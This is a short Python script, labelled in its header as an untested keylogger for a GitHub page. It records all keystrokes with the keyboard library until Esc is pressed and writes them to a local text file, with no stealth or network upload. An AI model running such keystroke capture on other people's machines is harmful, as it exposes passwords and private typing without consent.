# Untested keylogger intended for use on El-Qassam’s GitHub page. Made by Qassam, allowed for use on Argonify.
# Made with some valuable advice from a YouTube video by “Murtaza’s Wokshop” on detecting key inputs.

# import necessary modules
import keyboard

# define keylogger function
def keylogger():
    try:
        # record all keyboard events
        key_events = keyboard.record(until='esc')

        # save the key events to a text file
        with open('keylogger.txt', 'w') as file:
            for key_event in key_events:
                file.write(key_event.name + '\n')
    finally:
        # clean up after the program finishes
        keyboard.unhook_all()

# call the keylogger function
keylogger()
